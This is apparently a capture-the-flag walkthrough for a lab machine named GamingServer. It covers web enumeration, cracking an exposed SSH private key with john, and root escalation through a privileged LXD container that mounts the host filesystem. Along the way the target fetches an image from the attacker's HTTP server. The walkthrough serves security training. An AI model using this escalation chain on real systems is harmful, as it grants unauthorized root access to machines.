<h1>GamingServer</h1>

1. First of all basic **nmap** scan to detect open ports. It's:
 * 20 - ssh
 * 80 - http

2. Secantly lets scanning http server:
```
feroxbuster -u http://<ip> -w /usr/share/wordlists/dirb/common.txt
```

 * On **/secret** we found **secretKey** - RSA Private Key
 * On **/uploads** we found **/dict.lst** - Dictionary

3. Convert ssh key to hash for crack.
```
ssh2john secretKey > key.hash
```

Then, use dictionary to crack key.
```
john --wordlist=dict.lst key.hash
```

Note: I already find the username on comment of sourcecode. It's john :)

4. Authorized as john on ssh with key. And then get first user **flag**.

5. To get root flag we should run as sudo **/root/root.txt**

Obviously I don't have permission.

Get **lxd-alpine-builder** from git. And run on Kali machine
```
python3 -m http.server 80
```

6. On target (john) machine:
```
wget http://tun0IP/alpine-v3.13-x86_64-.tar.gz
```

7. Upload your custom Alpine Linux image into the local LXD library.
```
lxc image import ... --alias myimage
```

create a new container named ignite but do not start it yet. 
```
lxc init myimage ignite -c security.privileged=true
```

plug in the host's entire hard drive (source=/) into the container.
```
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

power on the container
```
lxc start ignite
```

open a shell inside the running container.
```lxc exec ignite /bin/sh```

Read root flag
```
cat /mnt/root/root/root.txt
```

That all from me. Bye
